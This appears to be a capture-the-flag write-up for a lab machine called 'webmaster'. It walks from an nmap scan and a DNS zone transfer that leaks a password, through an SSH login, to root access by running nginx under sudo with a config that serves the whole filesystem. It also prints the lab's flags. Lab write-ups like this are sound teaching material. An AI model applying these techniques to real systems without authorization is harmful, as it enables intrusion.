## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 --min-rate 5000 192.168.205.240
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 21:00 -0400
Nmap scan report for 192.168.205.240
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 08:00:27:14:EF:25 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

开放 22/53/80，重点看 DNS 和 Web。

## Web

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.205.240/
< HTTP/1.1 200 OK
< Server: nginx/1.14.2

 <img src="comic.png" alt="comic"> 
<!--webmaster.hmv-->
```

HTML 注释泄露域名 `webmaster.hmv`。

## DNS Zone Transfer

用域名做 zone transfer：

```bash
┌──(kali㉿kali)-[~]
└─$ dig axfr @192.168.205.240 webmaster.hmv

webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.		604800	IN	NS	ns1.webmaster.hmv.
ftp.webmaster.hmv.	604800	IN	CNAME	www.webmaster.hmv.
john.webmaster.hmv.	604800	IN	TXT	"Myhiddenpazzword"
mail.webmaster.hmv.	604800	IN	A	192.168.0.12
ns1.webmaster.hmv.	604800	IN	A	127.0.0.1
www.webmaster.hmv.	604800	IN	A	192.168.0.11
```

`john.webmaster.hmv` 的 TXT 记录里直接有密码：`Myhiddenpazzword`

## SSH

用 `john / Myhiddenpazzword` 登录：

```bash
┌──(kali㉿kali)-[~]
└─$ sshpass -p 'Myhiddenpazzword' ssh -o StrictHostKeyChecking=no john@192.168.205.240
john@webmaster:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

读取 user flag：

```bash
john@webmaster:~$ cat user.txt
HMVdnsyo
```

## 提权

### sudo -l

```bash
john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

john 可以无密码以 root 身份运行 nginx。

### nginx 提权

参考 GTFOBins，写一个 `user root;` 的配置，让 nginx worker 以 root 运行，`root /; autoindex on;` 让整个文件系统可读：

```bash
john@webmaster:~$ cat > /tmp/nginx.conf << 'EOF'
user root;
events {}
http {
    server {
        listen 8080;
        root /;
        autoindex on;
    }
}
EOF

john@webmaster:~$ sudo nginx -c /tmp/nginx.conf -p /tmp
```

**关键点：必须加 `-p /tmp` 指定 prefix 路径**，否则 nginx 无法加载模块目录下的 `.so` 文件，worker 进程不会启动。

通过新启动的 nginx 读取 root 目录：

```bash
john@webmaster:~$ wget http://127.0.0.1:8080/root/ -O -
<html>
<head><title>Index of /root/</title></head>
<body bgcolor="white">
<h1>Index of /root/</h1><hr><pre><a href="../">../</a>
<a href="flag.sh">flag.sh</a>                                            05-Dec-2020 09:49                1920
<a href="root.txt">root.txt</a>                                           05-Dec-2020 09:50                  13
</pre><hr></body>
</html>

john@webmaster:~$ wget http://127.0.0.1:8080/root/root.txt -O -
HMVnginxpwnd
```